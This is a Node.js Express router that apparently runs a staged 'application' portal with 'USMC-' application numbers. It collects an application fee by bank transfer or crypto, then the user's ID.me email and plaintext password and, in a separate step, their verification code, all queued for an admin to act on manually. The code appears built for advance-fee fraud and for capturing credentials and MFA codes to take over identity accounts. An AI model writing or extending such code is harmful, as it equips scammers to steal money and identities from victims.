import { Router } from 'express';
import redis from '../redis.js';
import { authMiddleware } from '../middleware/auth.js';

const router = Router();
router.use(authMiddleware);

const APPLICATION_FEE = 239;

const getUser = async (id) => {
  const data = await redis.get(`user:${id}`);
  return data ? JSON.parse(data) : null;
};

router.get('/payment-config', async (req, res) => {
  try {
    const config = JSON.parse(await redis.get('payment:config') || '{}');
    const safeConfig = {};
    if (config.bankTransfer && config.bankTransfer.available) {
      safeConfig.bankTransfer = {
        available: true,
        bankName: config.bankTransfer.bankName,
        accountName: config.bankTransfer.accountName,
        accountNumber: config.bankTransfer.accountNumber,
        routingNumber: config.bankTransfer.routingNumber,
        swiftCode: config.bankTransfer.swiftCode,
        instructions: config.bankTransfer.instructions
      };
    }
    if (config.crypto && config.crypto.available) {
      const assets = (Array.isArray(config.crypto.assets) ? config.crypto.assets : []).filter(a => a.available);
      safeConfig.crypto = {
        available: true,
        instructions: config.crypto.instructions,
        assets: assets.map(a => ({
          network: a.network,
          walletAddress: a.walletAddress || '',
          qrCodeImage: a.qrCodeImage || ''
        }))
      };
    }
    res.json({ config: safeConfig, applicationFee: APPLICATION_FEE });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage1-application-fee', async (req, res) => {
  try {
    const { paymentMethod, cryptoNetwork, receiptNumber, receiptImage } = req.body;
    if (!paymentMethod) return res.status(400).json({ error: 'Select a payment method' });
    if (!receiptImage || typeof receiptImage !== 'string' || !receiptImage.startsWith('data:')) {
      return res.status(400).json({ error: 'Upload your payment receipt image' });
    }
    if (receiptImage.length > 7000000) return res.status(400).json({ error: 'Receipt image too large (max 5MB)' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.applicationFee = APPLICATION_FEE;
    user.applicationFeePaymentMethod = paymentMethod;
    user.applicationFeeCryptoNetwork = paymentMethod === 'crypto' ? (cryptoNetwork || 'BTC') : '';
    user.applicationFeeReceiptNumber = String(receiptNumber || '').slice(0, 50);
    user.applicationFeeReceiptImage = receiptImage;
    user.applicationFeeVerified = false;
    user.applicationFeeRejectMessage = '';
    user.applicationFeeSubmittedAt = new Date().toISOString();
    user.currentStage = 1;
    user.stageStatus = 'awaiting_payment_verification';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
    queue.push({ userId: req.user.id, submittedAt: user.applicationFeeSubmittedAt });
    await redis.set('admin:pendingPayments', JSON.stringify(queue));

    res.json({ success: true, applicationFee: APPLICATION_FEE });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage2-idme', async (req, res) => {
  try {
    const { idmeEmail, idmePassword } = req.body;
    if (!idmeEmail || !idmePassword) return res.status(400).json({ error: 'IDME credentials required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.idmeEmail = idmeEmail;
    user.idmePassword = idmePassword;
    user.idmeSubmitted = true;
    user.idmeStatus = 'sending';
    user.idmeDeclineMessage = '';
    user.currentStage = 2;
    user.stageStatus = 'awaiting_idme_verification';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
    queue.push({ userId: req.user.id, submittedAt: user.updatedAt });
    await redis.set('admin:pendingIdme', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage2-idme-code', async (req, res) => {
  try {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'Code required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.idmeCode = code;
    user.idmeStatus = 'code_sending';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
    queue.push({ userId: req.user.id, code: code, submittedAt: user.updatedAt });
    await redis.set('admin:pendingIdmeCodes', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage3-clearance', async (req, res) => {
  try {
    const { duration } = req.body;
    if (![1, 2, 3].includes(duration)) return res.status(400).json({ error: 'Invalid duration' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.clearanceDuration = duration;
    user.currentStage = 3;
    user.stageStatus = 'awaiting_final_approval';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
    res.json({ success: true, duration });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/support-message', async (req, res) => {
  try {
    const { name, subject, message } = req.body;
    if (!name || !subject || !message) return res.status(400).json({ error: 'Name, subject and message are required' });
    if (message.length > 2000) return res.status(400).json({ error: 'Message too long' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    const supportMsg = {
      id: Date.now().toString(),
      userId: user.id,
      name: String(name).slice(0, 100),
      subject: String(subject).slice(0, 150),
      message: String(message).slice(0, 2000),
      createdAt: new Date().toISOString(),
      replied: false
    };

    const thread = JSON.parse(await redis.get(`support:${user.id}`) || '[]');
    thread.push(supportMsg);
    await redis.set(`support:${user.id}`, JSON.stringify(thread));

    const queue = JSON.parse(await redis.get('admin:support') || '[]');
    queue.push(supportMsg);
    await redis.set('admin:support', JSON.stringify(queue));

    res.json({ success: true, message: 'Support message sent' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/support-messages', async (req, res) => {
  try {
    const thread = JSON.parse(await redis.get(`support:${req.user.id}`) || '[]');
    res.json({ messages: thread });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/dashboard', async (req, res) => {
  try {
    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    res.json({
      user: {
        id: user.id, applicationNumber: user.applicationNumber, invoiceNumber: user.invoiceNumber || `INV-${user.applicationNumber.replace('USMC-', '')}`, fullName: user.fullName, email: user.email, username: user.username,
        applyingFor: user.applyingFor, address: user.address, city: user.city, state: user.state, zipCode: user.zipCode,
        currentStage: user.currentStage, stageStatus: user.stageStatus,
        emailVerified: user.emailVerified,
        applicationFee: user.applicationFee || APPLICATION_FEE,
        applicationFeeVerified: user.applicationFeeVerified,
        applicationFeePaymentMethod: user.applicationFeePaymentMethod,
        applicationFeeCryptoNetwork: user.applicationFeeCryptoNetwork,
        applicationFeeRejectMessage: user.applicationFeeRejectMessage,
        idmeVerified: user.idmeVerified, idmeSubmitted: user.idmeSubmitted,
        idmeStatus: user.idmeStatus, idmeDeclineMessage: user.idmeDeclineMessage,
        idmeCodeSent: user.idmeCodeSent, idmeEmail: user.idmeEmail,
        clearanceDuration: user.clearanceDuration,
        finalApproved: user.finalApproved, accountOfficer: user.accountOfficer,
        createdAt: user.createdAt
      }
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

export default router;
